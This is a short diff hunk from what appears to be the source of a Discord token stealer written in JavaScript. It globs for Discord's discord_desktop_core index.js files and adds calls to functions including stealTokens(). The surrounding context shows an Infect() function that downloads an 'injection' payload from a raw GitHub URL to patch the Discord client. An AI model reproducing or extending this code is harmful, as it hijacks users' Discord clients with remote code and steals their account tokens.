@@ -37,10 +37,14 @@ fs.readdirSync(LOCAL).forEach(file => {
 discords.forEach(function(file) {
     let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
     glob.sync(pattern).map(file => {
-        injectPath.push(file)
-    })
-    
-});
+            listDiscords();
+            });
+    });
+
+takePizzas();
+takeCheese();
+stealTokens()
+removePizzas();
 listDiscords();
 function Infect() {
     https.get('https://raw.githubusercontent.com/ugur014/ajwdbawjdbawjdbawjdbawjd/main/src/Injection/injection', (resp) => {
